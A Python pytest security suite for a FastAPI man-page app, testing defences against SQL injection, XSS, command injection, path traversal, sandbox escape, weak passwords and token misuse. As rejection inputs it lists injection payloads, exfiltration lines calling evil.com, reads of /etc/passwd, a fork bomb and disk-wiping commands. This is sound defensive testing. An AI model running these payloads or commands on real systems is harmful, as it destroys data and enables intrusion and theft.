"""
Security tests for BetterMan
"""
import pytest
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch
import time
import jwt
from datetime import datetime, timedelta

from src.main import app
from src.security.rate_limiter import RateLimiter
from src.parser.security_validator import SecurityValidator
from src.middleware.security import SecurityMiddleware


class TestSQLInjection:
    """Test SQL injection prevention"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_sql_injection_in_search(self, client):
        """Test SQL injection attempts in search"""
        injection_attempts = [
            "'; DROP TABLE manpages; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users WHERE 1=1; --",
            "' UNION SELECT * FROM users --",
            "1' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
        ]
        
        for attempt in injection_attempts:
            response = client.get(f"/api/search?q={attempt}")
            # Should not cause server error
            assert response.status_code in [200, 422]
            # Should not expose database structure
            assert "syntax error" not in response.text.lower()
            assert "sql" not in response.text.lower()
    
    def test_sql_injection_in_document_id(self, client):
        """Test SQL injection in document endpoints"""
        injection_attempts = [
            "1; DROP TABLE manpages;",
            "1 UNION SELECT * FROM users",
            "1' OR '1'='1"
        ]
        
        for attempt in injection_attempts:
            response = client.get(f"/api/documents/{attempt}")
            assert response.status_code in [404, 422]
            assert "sql" not in response.text.lower()
    
    def test_sql_injection_in_post_data(self, client):
        """Test SQL injection in POST request data"""
        response = client.post(
            "/api/auth/login",
            json={
                "username": "admin'--",
                "password": "' OR '1'='1"
            }
        )
        
        assert response.status_code == 401
        assert "sql" not in response.text.lower()


class TestXSSPrevention:
    """Test XSS prevention"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_xss_in_search_results(self, client):
        """Test XSS prevention in search results"""
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>"
        ]
        
        for attempt in xss_attempts:
            response = client.get(f"/api/search?q={attempt}")
            
            if response.status_code == 200:
                # Check that script tags are escaped
                assert "<script>" not in response.text
                assert "onerror=" not in response.text
                assert "javascript:" not in response.text
    
    def test_xss_in_document_content(self):
        """Test XSS prevention in document parsing"""
        validator = SecurityValidator()
        
        malicious_content = """
        .TH TEST 1
        .SH DESCRIPTION
        <script>alert('XSS')</script>
        <img src=x onerror=alert('XSS')>
        """
        
        result = validator.sanitize_html(malicious_content)
        
        assert "<script>" not in result
        assert "onerror=" not in result
    
    def test_xss_in_user_input(self, client):
        """Test XSS in user profile data"""
        # Would need auth setup
        pass


class TestAuthenticationSecurity:
    """Test authentication security"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_password_complexity_requirements(self, client):
        """Test password complexity validation"""
        weak_passwords = [
            "password",
            "12345678",
            "qwerty123",
            "admin123",
            "Password",  # No special char
            "Pass123",   # Too short
        ]
        
        for password in weak_passwords:
            response = client.post(
                "/api/auth/register",
                json={
                    "username": "testuser",
                    "email": "test@example.com",
                    "password": password
                }
            )
            
            assert response.status_code == 422
            assert "password" in response.text.lower()
    
    def test_jwt_token_security(self, client):
        """Test JWT token security"""
        # Register and login
        client.post(
            "/api/auth/register",
            json={
                "username": "jwttest",
                "email": "jwt@test.com",
                "password": "SecurePass123!"
            }
        )
        
        response = client.post(
            "/api/auth/login",
            json={
                "username": "jwttest",
                "password": "SecurePass123!"
            }
        )
        
        token = response.json()["access_token"]
        
        # Decode token (without verification for testing)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        # Check token has expiration
        assert "exp" in payload
        
        # Check token has proper claims
        assert "sub" in payload
        assert "type" in payload
    
    def test_token_expiration(self, client):
        """Test that expired tokens are rejected"""
        # Create expired token
        expired_token = jwt.encode(
            {
                "sub": "1",
                "exp": datetime.utcnow() - timedelta(hours=1)
            },
            "test_secret",
            algorithm="HS256"
        )
        
        response = client.get(
            "/api/user/profile",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        
        assert response.status_code == 401
    
    def test_invalid_token_rejected(self, client):
        """Test that invalid tokens are rejected"""
        invalid_tokens = [
            "invalid.token.here",
            "Bearer invalid",
            "",
            "null",
            "undefined"
        ]
        
        for token in invalid_tokens:
            response = client.get(
                "/api/user/profile",
                headers={"Authorization": f"Bearer {token}"}
            )
            
            assert response.status_code == 401
    
    def test_brute_force_protection(self, client):
        """Test brute force protection on login"""
        # Attempt multiple failed logins
        for i in range(10):
            response = client.post(
                "/api/auth/login",
                json={
                    "username": "admin",
                    "password": f"wrong{i}"
                }
            )
        
        # Should be rate limited or account locked
        assert response.status_code in [401, 429]


class TestInputValidation:
    """Test input validation and sanitization"""
    
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    def test_command_injection_prevention(self, validator):
        """Test command injection prevention"""
        dangerous_inputs = [
            "ls; rm -rf /",
            "grep test && cat /etc/passwd",
            "find | mail attacker@evil.com",
            "`cat /etc/passwd`",
            "$(whoami)",
            "test; curl evil.com/steal",
        ]
        
        for cmd in dangerous_inputs:
            assert not validator.is_safe_command(cmd)
    
    def test_path_traversal_prevention(self, validator):
        """Test path traversal prevention"""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config",
            "../../.env",
            "%2e%2e%2f%2e%2e%2f",
        ]
        
        for path in dangerous_paths:
            assert not validator.is_safe_path(path)
    
    def test_safe_command_validation(self, validator):
        """Test that safe commands are allowed"""
        safe_commands = [
            "ls",
            "ls -la",
            "grep pattern file.txt",
            "find . -name '*.txt'",
            "man ls",
            "echo 'hello world'"
        ]
        
        for cmd in safe_commands:
            assert validator.is_safe_command(cmd)
    
    def test_input_length_limits(self, client):
        """Test input length validation"""
        # Very long search query
        long_query = "a" * 10000
        response = client.get(f"/api/search?q={long_query}")
        
        assert response.status_code == 422
    
    def test_special_character_handling(self, validator):
        """Test special character sanitization"""
        inputs = [
            ("Hello <script>", "Hello &lt;script&gt;"),
            ("Test & Co.", "Test &amp; Co."),
            ('Quote "test"', "Quote &quot;test&quot;"),
            ("Line\nbreak", "Line break"),
            ("Null\x00byte", "Nullbyte")
        ]
        
        for input_str, expected in inputs:
            result = validator.sanitize_input(input_str)
            assert result == expected


class TestRateLimiting:
    """Test rate limiting implementation"""
    
    @pytest.fixture
    def rate_limiter(self):
        return RateLimiter()
    
    def test_rate_limit_per_ip(self, client):
        """Test rate limiting by IP address"""
        # Make rapid requests
        responses = []
        for _ in range(20):
            response = client.get("/api/search?q=test")
            responses.append(response.status_code)
            
        # Should hit rate limit
        assert 429 in responses
    
    def test_rate_limit_reset(self, rate_limiter):
        """Test rate limit reset after window"""
        client_id = "test_client"
        
        # Use up rate limit
        for _ in range(10):
            rate_limiter.check_rate_limit(client_id, limit=10)
        
        # Should be rate limited
        with pytest.raises(Exception):
            rate_limiter.check_rate_limit(client_id, limit=10)
        
        # Wait for reset (mock time passing)
        with patch('time.time', return_value=time.time() + 61):
            # Should work again
            assert rate_limiter.check_rate_limit(client_id, limit=10)
    
    def test_different_endpoints_different_limits(self, client):
        """Test different rate limits for different endpoints"""
        # Search endpoint (higher limit)
        search_responses = []
        for _ in range(50):
            response = client.get("/api/search?q=test")
            search_responses.append(response.status_code)
        
        # Auth endpoint (lower limit)
        auth_responses = []
        for _ in range(10):
            response = client.post(
                "/api/auth/login",
                json={"username": "test", "password": "test"}
            )
            auth_responses.append(response.status_code)
        
        # Auth should be limited first
        assert 429 in auth_responses
        assert search_responses.count(429) < auth_responses.count(429)


class TestTerminalSecurity:
    """Test terminal sandbox security"""
    
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    def test_forbidden_commands(self, validator):
        """Test that dangerous commands are blocked"""
        forbidden = [
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "chmod 777 /etc/passwd",
            "pkill -9 -1",
            "reboot",
            "shutdown now",
            "mkfs.ext4 /dev/sda1"
        ]
        
        for cmd in forbidden:
            assert not validator.is_safe_terminal_command(cmd)
    
    def test_resource_limits(self, client):
        """Test terminal resource limits"""
        # Would need terminal endpoint implementation
        pass
    
    def test_sandbox_escape_prevention(self, validator):
        """Test sandbox escape attempts"""
        escape_attempts = [
            "docker run --privileged",
            "nsenter --target 1",
            "unshare --mount",
            "chroot /",
            "mount -o bind"
        ]
        
        for cmd in escape_attempts:
            assert not validator.is_safe_terminal_command(cmd)


class TestSecurityHeaders:
    """Test security headers"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_security_headers_present(self, client):
        """Test that security headers are set"""
        response = client.get("/api/health")
        
        headers = response.headers
        
        # Check security headers
        assert "X-Content-Type-Options" in headers
        assert headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-Frame-Options" in headers
        assert headers["X-Frame-Options"] == "DENY"
        
        assert "X-XSS-Protection" in headers
        assert headers["X-XSS-Protection"] == "1; mode=block"
        
        assert "Strict-Transport-Security" in headers
        
        # CSP header
        assert "Content-Security-Policy" in headers
    
    def test_cors_configuration(self, client):
        """Test CORS is properly configured"""
        response = client.options(
            "/api/search",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "GET"
            }
        )
        
        assert "Access-Control-Allow-Origin" in response.headers
        assert "Access-Control-Allow-Methods" in response.headers
    
    def test_no_sensitive_headers(self, client):
        """Test that sensitive information is not exposed in headers"""
        response = client.get("/api/health")
        
        # Should not expose server details
        assert "Server" not in response.headers or "gunicorn" not in response.headers.get("Server", "")
        assert "X-Powered-By" not in response.headers


class TestDataPrivacy:
    """Test data privacy and GDPR compliance"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_no_password_in_responses(self, client):
        """Test that passwords are never returned in responses"""
        # Register user
        client.post(
            "/api/auth/register",
            json={
                "username": "privacytest",
                "email": "privacy@test.com",
                "password": "SecurePass123!"
            }
        )
        
        # Login
        response = client.post(
            "/api/auth/login",
            json={
                "username": "privacytest",
                "password": "SecurePass123!"
            }
        )
        
        # Check response doesn't contain password
        assert "password" not in response.text
        assert "SecurePass123!" not in response.text
    
    def test_user_data_export(self, client):
        """Test user can export their data (GDPR)"""
        # Would need endpoint implementation
        pass
    
    def test_user_data_deletion(self, client):
        """Test user can delete their account (GDPR)"""
        # Would need endpoint implementation
        pass
    
    def test_audit_logging(self):
        """Test that security events are logged"""
        # Would need logging verification
        pass


class TestCryptography:
    """Test cryptographic implementations"""
    
    def test_password_hashing(self):
        """Test password hashing is secure"""
        from src.models.user import User
        
        user = User(username="test", email="test@test.com")
        user.set_password("TestPassword123!")
        
        # Password should be hashed
        assert user.password_hash != "TestPassword123!"
        
        # Should use bcrypt (starts with $2b$)
        assert user.password_hash.startswith("$2b$")
        
        # Verify works
        assert user.verify_password("TestPassword123!")
        assert not user.verify_password("WrongPassword")
    
    def test_token_signing(self):
        """Test JWT token signing"""
        from src.auth.auth_service import AuthService
        
        auth = AuthService(db=Mock())
        token = auth.create_access_token({"sub": "1"})
        
        # Should be able to decode with correct secret
        payload = auth.decode_token(token)
        assert payload["sub"] == "1"
    
    def test_2fa_secret_generation(self):
        """Test 2FA secret generation"""
        from src.models.user import User
        import pyotp
        
        user = User(username="test", email="test@test.com")
        secret = user.generate_totp_secret()
        
        # Should be valid base32
        assert pyotp.TOTP(secret).now() is not None
        
        # Should be sufficiently long
        assert len(secret) >= 16